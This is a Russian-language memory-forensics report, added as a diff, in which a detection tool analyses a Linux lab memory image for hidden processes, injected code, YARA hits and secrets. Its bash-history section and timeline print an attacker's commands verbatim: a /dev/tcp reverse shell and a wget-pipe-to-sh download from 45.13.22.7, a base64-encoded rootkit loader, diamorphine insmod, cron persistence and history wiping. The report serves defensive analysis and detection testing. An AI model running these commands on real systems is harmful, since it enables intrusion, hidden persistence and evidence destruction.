@@ -1,0 +1,369 @@
+==============================================================================
+LMA 2.1 — отчёт анализа образа памяти
+Сформирован: 2026-11-14 19:03:02
+Образ: /workspace/lma2/build/lab/memory_lab.raw (128.0 MiB)
+Окружение: Python 3.12.15, Volatility 3 не установлен, YARA 4.5.4
+==============================================================================
+
+[1] ИДЕНТИФИКАЦИЯ ЯДРА (без инициализации фреймворка)
+------------------------------------------------------------------------------
+Версия ядра      : 6.17.0-19-generic
+Баннер           : Linux version 6.17.0-19-generic (buildd@lcy02-amd64-073) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0) #20~24.04.2-Ubuntu SMP PREEMP
+Смещение баннера : 0x1000
+Найдено баннеров : 6 (всего кандидатов: 2)
+Достоверность    : 0.852
+Компилятор       : -
+
+[2] ТАБЛИЦА СИМВОЛОВ ISF
+------------------------------------------------------------------------------
+Источник : fixture_stand   Время: 0.0 с
+Путь     : -
+Проверка : не требуется: артефакты читаются из фикстур плагинов
+
+[3] ПРОЦЕСсы (linux.pslist): 9
+------------------------------------------------------------------------------
+    PID    PPID     TID  COMM                     UID
+      1       0       1  systemd                  0
+      2       0       2  kthreadd                 0
+    910       1     910  sshd                     0
+   1450       1    1450  nginx                    33
+   2100     910    2100  bash                     1000
+   3100    2100    3100  python3                  1000
+   3300    2100    3300  defunct                  1000
+   4100       1    4100  kworker/u8:2             0
+   4300    2100    4300  vol.py                   1000
+
+[4] ПЕРЕКРЁСТНАЯ ПРОВЕРКА (Cross-View Validation)
+------------------------------------------------------------------------------
+pslist задач: 9   psscan задач: 17
+Отбраковано как потоки (TID != PID)      : 6
+Отбраковано как завершённые (EXIT_STATE) : 1
+Скрытых процессов (уточнённый критерий)  : 1
+  PID 4242 TID 4242 COMM kworker/u8:3 PPID 1 EXIT_STATE TASK_RUNNING offset 0x10001f000
+Наивный критерий курсовой (разность PID) : 2 срабатываний → ложных: 1
+
+[5] ИСТОРИЯ КОМАНД (linux.bash): 14 команд
+------------------------------------------------------------------------------
+  [КРИТ] 2026-11-14T20:14:41+00:00
+      $ bash -i >& /dev/tcp/45.13.22.7/4444 0>&1
+      → обратная оболочка через /dev/tcp | BASH_RShell_DevTcp | MITRE T1059.004
+  [ВЫС] 2026-11-14T20:14:02+00:00
+      $ wget -qO- http://45.13.22.7/stage.sh | sh
+      → загрузка и немедленное исполнение кода из сети | BASH_Download_Exec | MITRE T1105
+  [ВЫС] 2026-11-14T20:15:03+00:00
+      $ echo aW5zbW9kIC90bXAvLmhpZGUvZGlhbW9ycGhpbmUua28K | base64 -d | sh
+      → деобфускация и исполнение полезной нагрузки | BASH_Deobfuscate | MITRE T1140
+  [ВЫС] 2026-11-14T20:15:22+00:00
+      $ insmod /tmp/.hide/diamorphine.ko
+      → загрузка модуля ядра | BASH_Module_Load | MITRE T1547.006
+  [ВЫС] 2026-11-14T20:16:31+00:00
+      $ history -c
+      → сокрытие следов активности (очистка истории) | BASH_AntiForensics | MITRE T1070.003
+  [СРЕД] 2026-11-14T20:16:10+00:00
+      $ crontab -l | { cat; echo "* * * * * /tmp/.x/kworker"; } | crontab -
+      → закрепление в системе (автозапуск) | BASH_Persistence | MITRE T1053.003
+  [НИЗ] 2026-11-14T20:14:19+00:00
+      $ chmod +x /tmp/.x/kworker
+      → выдача прав на исполнение | BASH_ChmodExec | MITRE T1222.002
+  [подавлено] wget https://archive.ubuntu.com/ubuntu/pool/main/v/vim/vim_9.1.0-1ubuntu1_amd64.deb
+      причина: загрузка из доверенного репозитория (archive.ubuntu.com)
+  [подавлено] chmod +x ./configure
+      причина: выдача прав в контексте сборки/скрипта проекта
+  [подавлено] curl https://raw.githubusercontent.com/volatilityfoundation/volatility3/master/README.md
+      причина: загрузка из доверенного репозитория (raw.githubusercontent.com)
+
+[6] ОБЛАСТИ ПАМЯТИ С ПРИЗНАКАМИ ИНЪЕКЦИИ (malfind + энтропия)
+------------------------------------------------------------------------------
+   PID        START      SIZE  H(bit/B)  PRINT  ВЕРДИКТ
+  4242 0x7f0000000000     98304     7.999  0.383  packed_or_encrypted
+       энтропия 7.999 ≥ 7.2: упакованная/шифрованная нагрузка
+       YARA: Linux_Injection_Shellcode_Socket_x64 [КРИТ] MITRE T1055
+       YARA: Linux_Injection_Shellcode_Socket_x64 [КРИТ] MITRE T1055
+       YARA: Linux_Injection_Shellcode_Socket_x64 [КРИТ] MITRE T1055
+       YARA: Linux_Injection_Shellcode_Socket_x64 [КРИТ] MITRE T1055
+       YARA: Linux_Injection_Shellcode_Socket_x64 [КРИТ] MITRE T1055
+       YARA: Linux_Injection_Shellcode_Socket_x64 [КРИТ] MITRE T1055
+  4242 0x7f0000300000     49152     7.996  0.379  packed_or_encrypted
+       энтропия 7.996 ≥ 7.2: упакованная/шифрованная нагрузка
+       YARA: Linux_Injection_ELF_Header_In_Anon_VMA [ВЫС] MITRE T1055.009
+       YARA: Linux_Injection_Packed_High_Entropy [СРЕД] MITRE T1027.002
+       YARA: Linux_Injection_Packed_High_Entropy [СРЕД] MITRE T1027.002
+  [отсеяно] PID 4242 0x7f0000100000 H=0.0 — нулевое заполнение (энтропия 0.0)
+  [отсеяно] PID 1450 0x7f1000000000 H=1.462 — текстовые данные (printable=1.0, энтропия 1.462)
+Предфильтрация: областей 4, сканировано 2, отсеяно 2; сокращение объёма сканирования 40.0 %
+
+[7] СИГНАТУРНЫЕ НАХОДКИ YARA
+------------------------------------------------------------------------------
+Режим: hybrid   Время: 0.258 с   Объём: 134217728 Б   Скорость: 496.1 МиБ/с
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область vma  смещение 0x0
+      фрагмент: j)X·j·_j·^
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область vma  смещение 0xa
+      фрагмент: H1·H1·H1·H1·
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область vma  смещение 0x16
+      фрагмент: ··
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область vma  смещение 0x18
+      фрагмент: /bin/sh
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область vma  смещение 0xaca0
+      фрагмент: ··
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область vma  смещение 0x1243a
+      фрагмент: ··
+  [КРИТ] Linux_Malware_Reverse_Shell  (malware, MITRE T1059.004)
+      PID 2100  область full_image  смещение 0x100043
+      фрагмент: bash -i >& /dev/tcp/
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область full_image  смещение 0x800000
+      фрагмент: j)X·j·_j·^
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область full_image  смещение 0x80000a
+      фрагмент: H1·H1·H1·H1·
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область full_image  смещение 0x800016
+      фрагмент: ··
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область full_image  смещение 0x800018
+      фрагмент: /bin/sh
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область full_image  смещение 0x80aca0
+      фрагмент: ··
+  [КРИТ] Linux_Injection_Shellcode_Socket_x64  (malware, MITRE T1055)
+      PID 4242  область full_image  смещение 0x81243a
+      фрагмент: ··
+  [ВЫС] Linux_Injection_ELF_Header_In_Anon_VMA  (malware, MITRE T1055.009)
+      PID 4242  область vma  смещение 0x0
+      фрагмент: ·ELF···
+  [ВЫС] Linux_Malware_Download_And_Execute  (malware, MITRE T1105)
+      PID 2100  область full_image  смещение 0x100000
+      фрагмент: wget -qO- http://45.13.22.7/stage.sh | sh
+  [ВЫС] Linux_Malware_Encoded_Payload_Exec  (malware, MITRE T1140)
+      PID 2100  область full_image  смещение 0x10006c
+      фрагмент: echo aW5zbW9kIC90bXAvLmhpZGUvZGlhbW9ycGhpbmUua28
+  [ВЫС] Linux_Malware_Kernel_Module_Loader  (malware, MITRE T1547.006)
+      PID 2100  область full_image  смещение 0x1000af
+      фрагмент: insmod /tmp/.hide/diamorphine.ko
+  [ВЫС] Linux_Malware_AntiForensics_History  (malware, MITRE T1070.003)
+      PID 2100  область full_image  смещение 0x100114
+      фрагмент: history -c
+  [ВЫС] Linux_Secret_Private_Key_PEM  (secrets, MITRE T1552.004)
+      PID 3100  область full_image  смещение 0x400000
+      фрагмент: -----BEGIN R…[REDACTED] sha256:94b1117af5e4f766
+  [ВЫС] Linux_Secret_Cloud_Token  (secrets, MITRE T1552.001)
+      PID 3100  область full_image  смещение 0x400112
+      фрагмент: AKIAIOSFODNN…[REDACTED] sha256:1a5d44a2dca19669
+  [ВЫС] Linux_Secret_Cloud_Token  (secrets, MITRE T1552.001)
+      PID 3100  область full_image  смещение 0x400174
+      фрагмент: ghp_16C7e42F…[REDACTED] sha256:3543c50b0cb9cea8
+  [ВЫС] Linux_Secret_Cloud_Token  (secrets, MITRE T1552.001)
+      PID 3100  область full_image  смещение 0x4001a9
+      фрагмент: xoxb-2785493…[REDACTED] sha256:81247f15ef70f67e
+  [ВЫС] Linux_Secret_Cloud_Token  (secrets, MITRE T1552.001)
+      PID 3100  область full_image  смещение 0x4001f3
+      фрагмент: eyJhbGciOiJI…[REDACTED] sha256:7c5b0229189828de
+  [ВЫС] Linux_Secret_DB_Connection_String  (secrets, MITRE T1552.001)
+      PID 3100  область full_image  смещение 0x40025d
+      фрагмент: postgresql:/…[REDACTED] sha256:6047d0b5c6de1d3c
+  [СРЕД] Linux_Injection_Packed_High_Entropy  (malware, MITRE T1027.002)
+      PID 4242  область vma  смещение 0x40
+      фрагмент: UPX!
+  [СРЕД] Linux_Injection_Packed_High_Entropy  (malware, MITRE T1027.002)
+      PID 4242  область vma  смещение 0x4a
+      фрагмент: This file is packed with the UPX
+  [СРЕД] Linux_Secret_Shadow_Hash  (secrets, MITRE T1003.008)
+      PID 3100  область full_image  смещение 0x40029f
+      фрагмент: nikita:$6$ru…[REDACTED] sha256:45ac9911658c30f6
+  [СРЕД] Linux_Injection_Packed_High_Entropy  (malware, MITRE T1027.002)
+      PID 4242  область full_image  смещение 0xb00040
+      фрагмент: UPX!
+  [СРЕД] Linux_Injection_Packed_High_Entropy  (malware, MITRE T1027.002)
+      PID 4242  область full_image  смещение 0xb0004a
+      фрагмент: This file is packed with the UPX
+
+[8] РЕПУТАЦИОННАЯ ПРОВЕРКА ХЕШЕЙ
+------------------------------------------------------------------------------
+Провайдер: local   записей в кеше: 2   попаданий в кеш: 2   сетевых запросов: 0
+  44439b744f11affe093652836beac61b…  malicious    Lab.Loader.Shellcode  [local_reference_list/cache]
+  a5193f5c7adbf4c57b72d7ff1d62f7c1…  suspicious   Lab.Packed.UPX  [local_reference_list/cache]
+
+[9] КАЧЕСТВО ДЕТЕКТИРОВАНИЯ (сверка с эталонной разметкой стенда)
+------------------------------------------------------------------------------
+Детектор                            TP  FP  FN  Precision   Recall     F1
+Скрытые процессы (DKOM)              1   0   0        1.0      1.0    1.0
+Эвристики истории bash               7   0   0        1.0      1.0    1.0
+Сигнатуры YARA                      12   0   0        1.0      1.0    1.0
+Инъекции (malfind + энтропия)        2   0   0        1.0      1.0    1.0
+ИТОГО (микроусреднение)             22   0   0        1.0      1.0    1.0
+Контрольные «чистые» двойники: 6, ложно помечено: 0 (доля 0.0)
+
+[10] ХРОНОЛОГИЯ ИНЦИДЕНТА (timeline)
+------------------------------------------------------------------------------
+Событий: 57   окно наблюдения: 2026-11-14T19:55:00+00:00 … 2026-11-14T20:16:31+00:00
+  срабатывание YARA: 29  создание процесса: 9  команда bash: 14  инъекция в память: 2  репутация хеша: 2  скрытый процесс (DKOM): 1
+  [КРИТ ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 2100 bash
+        Linux_Malware_Reverse_Shell (MITRE T1059.004), смещение 0x100043
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 2100 bash
+        Linux_Malware_Download_And_Execute (MITRE T1105), смещение 0x100000
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 2100 bash
+        Linux_Malware_Encoded_Payload_Exec (MITRE T1140), смещение 0x10006c
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 2100 bash
+        Linux_Malware_Kernel_Module_Loader (MITRE T1547.006), смещение 0x1000af
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 2100 bash
+        Linux_Malware_AntiForensics_History (MITRE T1070.003), смещение 0x100114
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 3100 python3
+        Linux_Secret_Private_Key_PEM (MITRE T1552.004), смещение 0x400000
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 3100 python3
+        Linux_Secret_Cloud_Token (MITRE T1552.001), смещение 0x400112
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 3100 python3
+        Linux_Secret_Cloud_Token (MITRE T1552.001), смещение 0x400174
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 3100 python3
+        Linux_Secret_Cloud_Token (MITRE T1552.001), смещение 0x4001a9
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 3100 python3
+        Linux_Secret_Cloud_Token (MITRE T1552.001), смещение 0x4001f3
+  [ВЫС  ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 3100 python3
+        Linux_Secret_DB_Connection_String (MITRE T1552.001), смещение 0x40025d
+  [СРЕД ] 2026-11-14T19:55:00+00:00* срабатывание YARA        PID 3100 python3
+        Linux_Secret_Shadow_Hash (MITRE T1003.008), смещение 0x40029f
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 1 systemd
+        PPID 0, UID 0
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 2 kthreadd
+        PPID 0, UID 0
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 910 sshd
+        PPID 1, UID 0
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 1450 nginx
+        PPID 1, UID 33
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 2100 bash
+        PPID 910, UID 1000
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 3100 python3
+        PPID 2100, UID 1000
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 3300 defunct
+        PPID 2100, UID 1000
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 4100 kworker/u8:2
+        PPID 1, UID 0
+  [ИНФО ] 2026-11-14T19:55:00+00:00 создание процесса        PID 4300 vol.py
+        PPID 2100, UID 1000
+  [ИНФО ] 2026-11-14T19:58:11+00:00 команда bash             PID 2100 bash
+        команда из истории bash
+        $ wget https://archive.ubuntu.com/ubuntu/pool/main/v/vim/vim_9.1.0-1ubuntu1_amd64.deb
+  [ИНФО ] 2026-11-14T20:01:44+00:00 команда bash             PID 2100 bash
+        команда из истории bash
+        $ chmod +x ./configure
+  [ИНФО ] 2026-11-14T20:03:02+00:00 команда bash             PID 2100 bash
+        команда из истории bash
+        $ curl https://raw.githubusercontent.com/volatilityfoundation/volatility3/master/README.md
+  [ИНФО ] 2026-11-14T20:05:19+00:00 команда bash             PID 2100 bash
+        команда из истории bash
+        $ sudo apt install linux-image-unsigned-6.17.0-19-generic-dbgsym
+  [ИНФО ] 2026-11-14T20:07:51+00:00 команда bash             PID 2100 bash
+        команда из истории bash
+        $ python3 -m venv .venv
+  [ИНФО ] 2026-11-14T20:09:30+00:00 команда bash             PID 2100 bash
+        команда из истории bash
+        $ man 3 crypt
+  [ИНФО ] 2026-11-14T20:11:07+00:00 команда bash             PID 2100 bash
+        команда из истории bash
+        $ git commit -m "entropy prefilter for malfind regions"
+  [ВЫС  ] 2026-11-14T20:14:02+00:00 команда bash             PID 2100 bash
+        подозрительная команда: загрузка и немедленное исполнение кода из сети
+        $ wget -qO- http://45.13.22.7/stage.sh | sh
+  [НИЗ  ] 2026-11-14T20:14:19+00:00 команда bash             PID 2100 bash
+        подозрительная команда: выдача прав на исполнение
+        $ chmod +x /tmp/.x/kworker
+  [КРИТ ] 2026-11-14T20:14:41+00:00 команда bash             PID 2100 bash
+        подозрительная команда: обратная оболочка через /dev/tcp
+        $ bash -i >& /dev/tcp/45.13.22.7/4444 0>&1
+  [ВЫС  ] 2026-11-14T20:15:03+00:00 команда bash             PID 2100 bash
+        подозрительная команда: деобфускация и исполнение полезной нагрузки
+        $ echo aW5zbW9kIC90bXAvLmhpZGUvZGlhbW9ycGhpbmUua28K | base64 -d | sh
+  [ВЫС  ] 2026-11-14T20:15:22+00:00 команда bash             PID 2100 bash
+        подозрительная команда: загрузка модуля ядра
+        $ insmod /tmp/.hide/diamorphine.ko
+  [СРЕД ] 2026-11-14T20:16:10+00:00 команда bash             PID 2100 bash
+        подозрительная команда: закрепление в системе (автозапуск)
+        $ crontab -l | { cat; echo "* * * * * /tmp/.x/kworker"; } | crontab -
+  [ВЫС  ] 2026-11-14T20:16:31+00:00 команда bash             PID 2100 bash
+        подозрительная команда: сокрытие следов активности (очистка истории)
+        $ history -c
+  [КРИТ ] —* инъекция в память        PID 4242 kworker/u8:3
+        packed_or_encrypted: энтропия 7.999 ≥ 7.2: упакованная/шифрованная нагрузка
+  [КРИТ ] —* репутация хеша           PID 4242 kworker/u8:3
+        хеш 44439b744f11affe… — malicious (Lab.Loader.Shellcode, local_reference_list)
+  [КРИТ ] —* скрытый процесс (DKOM)   PID 4242 kworker/u8:3
+        TID 4242 == PID, EXIT_STATE TASK_RUNNING, задача отсутствует в pslist, task_struct 0x10001f000
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x0
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0xa
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x16
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x18
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0xaca0
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x1243a
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x800000
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x80000a
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x800016
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x800018
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x80aca0
+  [КРИТ ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Shellcode_Socket_x64 (MITRE T1055), смещение 0x81243a
+  [ВЫС  ] —* инъекция в память        PID 4242 kworker/u8:3
+        packed_or_encrypted: энтропия 7.996 ≥ 7.2: упакованная/шифрованная нагрузка
+  [ВЫС  ] —* репутация хеша           PID 4242 kworker/u8:3
+        хеш a5193f5c7adbf4c5… — suspicious (Lab.Packed.UPX, local_reference_list)
+  [ВЫС  ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_ELF_Header_In_Anon_VMA (MITRE T1055.009), смещение 0x0
+  [СРЕД ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Packed_High_Entropy (MITRE T1027.002), смещение 0x40
+  [СРЕД ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Packed_High_Entropy (MITRE T1027.002), смещение 0x4a
+  [СРЕД ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Packed_High_Entropy (MITRE T1027.002), смещение 0xb00040
+  [СРЕД ] —* срабатывание YARA        PID 4242 kworker/u8:3
+        Linux_Injection_Packed_High_Entropy (MITRE T1027.002), смещение 0xb0004a
+  (* событие привязано ко времени создания процесса-владельца)
+
+[11] ВРЕМЯ ВЫПОЛНЕНИЯ ЭТАПОВ (измерено)
+------------------------------------------------------------------------------
+  Идентификация ядра (потоковый поиск баннеров)    0.67 с  
+  Подготовка ISF-профиля                           0.0 с  
+  Извлечение артефактов (4 плагина)              0.002 с  
+  Cross-View Validation + эвристики bash         0.001 с  
+  Анализ областей памяти (энтропия + YARA по областям)   0.018 с  
+  YARA: сканирование полного образа              0.263 с  
+  Репутационная проверка хешей (кеш SQLite)       0.01 с  
+  Построение хронологии инцидента (timeline)       0.0 с  
+  Сверка с эталонной разметкой (метрики)           0.0 с  
+  ИТОГО                                          0.964 с
+
+[12] ТРУДОЗАТРАТЫ ОПЕРАТОРА
+------------------------------------------------------------------------------
+Ручной режим  : 6 этапов, 12 действий оператора, ≈47.0 мин (оценочная модель)
+Конвейер LMA  : 1 команда, 0.02 мин (измерено)
+Сокращение времени: ×2925.3 (оценка)
+Примечание: Время ручного режима — оценочная модель трудозатрат, время конвейера измерено фактически. Для итоговой таблицы главы 3 требуется прямой хронометраж ручного режима на стенде.
+
+==============================================================================
+СВОДКА
+------------------------------------------------------------------------------
+  Версия ядра                             6.17.0-19-generic
+  Процессов / task_struct                 9 / 17
+  Скрытых процессов (DKOM)                1
+  Подозрительных команд                   7
+  Подавлено контекстным фильтром          3
+  Областей с признаками инъекции          2
+  Находок YARA                            29
+  Категории находок                       malware: 22, secrets: 7
+  Время анализа, с                        0.964
+==============================================================================
+
